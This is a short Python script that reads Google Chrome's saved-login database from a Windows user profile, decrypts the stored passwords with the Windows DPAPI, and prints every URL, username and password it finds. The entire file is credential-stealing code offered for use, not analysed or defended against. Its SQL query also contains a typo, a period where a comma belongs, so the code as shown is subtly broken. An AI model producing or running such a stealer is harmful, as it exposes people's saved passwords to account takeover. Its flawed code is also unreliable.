
import os
import sqlite3
import win32crypt


def crackPass():
    path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
    connect = sqlite3.connect(path)
    cursor = connect.cursor()
    select = 'SELECT origin_url, username_value. password_value FROM logins'
    cursor.execute(select)

    data = cursor.fetchall()
    dictionary = {}
    string = ''

    for url, user_name, passwd in data:
        passwd = win32crypt.CryptUnprotectData(passwd)
        dictionary[url] = (user_name, passwd[1].decode('utf-8'))
        string += '\n[+] URL:%s USERNAME:%s PASSWORD:%s\n' % (url, user_name, passwd[1].decode('utf8'))
        print(string)


if __name__ == '__main__':
    crackPass()

